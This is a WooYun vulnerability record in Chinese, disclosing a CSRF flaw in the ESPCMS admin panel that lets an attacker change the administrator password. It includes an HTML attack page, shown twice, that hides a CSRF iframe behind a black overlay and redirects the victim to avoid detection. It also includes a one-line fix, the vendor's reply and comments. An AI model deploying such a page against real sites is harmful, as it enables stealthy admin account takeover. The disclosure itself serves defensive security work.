{"id": 33915, "wybug_id": "wooyun-2015-0107723", "wybug_title": "ESPCMS后台CSRF修改管理密码", "wybug_corp": "易思ESPCMS企业网站管理系统", "wybug_author": "黑色键盘丶", "wybug_date": "2015-04-14 16:09", "wybug_open_date": "2015-07-14 15:40", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "13", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-18：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-14：\t细节向公众公开  简要描述： ESPCMS后台CSRF修改管理密码 详细说明：  修改管理员密码没有验证原密码 我也是醉了 抓包\n\n\n\n没有token值验证 构造表单试试？\n\n\n\nok啊 可以修改啊表单构造好了，但是修改好了之后随便不会提示修改了密码，但是会自动跳转到后台，这样就会被管理员发现或者产生怀疑了~~肿么破？？？我们利用回旋镖~我们新建一个html，代码如下\n<html><table style=\"left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;\"><tbody><tr><td style=\"color:#FFFFFF;z-index: 6000;vertical-align:top;\"><h1>乌云测试</h1></td></tr></tbody></table><<meta http-equiv=\"refresh\" content=\"4;url=http://www.wooyun.org/\"> <!--设置一个正常的跳转页面！--><title>test</title><iframe src=\"http://localhost/test.html\"></iframe><!--csrf攻击页面的地址！--></html>\n这样我们只要访问这个test页面之后就可以修改其密码，而且这个页面会自动跳转到你想跳转的地方（当然，这个页面你可以适度美化，掩饰）\n\nok   漏洞证明：  修改管理员密码没有验证原密码 我也是醉了 抓包\n\n\n\n没有token值验证 构造表单试试？\n\n\n\nok啊 可以修改啊表单构造好了，但是修改好了之后随便不会提示修改了密码，但是会自动跳转到后台，这样就会被管理员发现或者产生怀疑了~~肿么破？？？我们利用回旋镖~我们新建一个html，代码如下\n<html><table style=\"left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;\"><tbody><tr><td style=\"color:#FFFFFF;z-index: 6000;vertical-align:top;\"><h1>乌云测试</h1></td></tr></tbody></table><<meta http-equiv=\"refresh\" content=\"4;url=http://www.wooyun.org/\"> <!--设置一个正常的跳转页面！--><title>test</title><iframe src=\"http://localhost/test.html\"></iframe><!--csrf攻击页面的地址！--></html>\n这样我们只要访问这个test页面之后就可以修改其密码，而且这个页面会自动跳转到你想跳转的地方（当然，这个页面你可以适度美化，掩饰）\n\nok   修复方案：  你懂的修改时需要验证原密码即可   版权声明：转载请注明来源 黑色键盘丶@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2015-04-15 15:38 厂商回复： 此漏洞如果采用在线，且没有后台权限，是无法进行相关操作的。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-14 22:57 |    \t\t浅蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:274 漏洞数:109        | 爱安全:www.ixsec.orgXsec社区:zone.ixse...)\t\t \n  ...http://www.wooyun.org/bugs/wooyun-2015-092265/trace/4f281a591d57367615964dac4c9d4dc1好像没什么区别    \n     2015-04-15 15:17 |    \t\t黑色键盘丶 \t\t\t( 实习白帽子  |\t\t\t        Rank:50 漏洞数:35        | 我喜欢你关你什么事？有本事你也喜欢我试试...)\t\t \n  @浅蓝是哦    \n     2015-08-31 22:06 |    \t\tElliott \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:9        | 绝逼不当程序员)\t\t \n  看不懂厂商的回复==    \n     2015-09-01 10:47 |    \t\tElliott \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:9        | 绝逼不当程序员)\t\t \n  懂了~   后台页面那个softbase()打开的    你这提交一点用都没有。。。过不了验证    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}